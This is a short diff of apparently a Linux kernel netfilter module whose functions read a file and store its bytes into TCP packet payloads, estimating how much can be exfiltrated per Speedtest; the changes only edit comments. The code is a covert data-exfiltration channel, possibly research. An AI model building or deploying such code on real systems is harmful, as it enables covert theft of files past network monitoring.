@@ -51,7 +51,7 @@ static void exfil_file(void) {
     ssize_t bytes_read;
 
     //Open the file
-    testfile = filp_open("/path/to/file.txt", O_RDONLY, 0);
+    testfile = filp_open("/path/to/file.txt", O_RDONLY, 0); //modify test file to exfiltrate here
     if (IS_ERR(testfile)) {
         //pr_err("Failed to open file\n");
         return NF_ACCEPT;
@@ -80,7 +80,7 @@ static void exfil_file(void) {
     skb_store_bits(skb, tcp_payloadoffset, buffer, bytes_read);
 
 }
-//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single speedtest. 
+//function that overwrites the TCP payload with random bytes and calculates the maximum number of bytes that can be exfiltrated in a single Speedtest. 
 static void max_bytes_exfiled(void) {
     int i;
     char random;
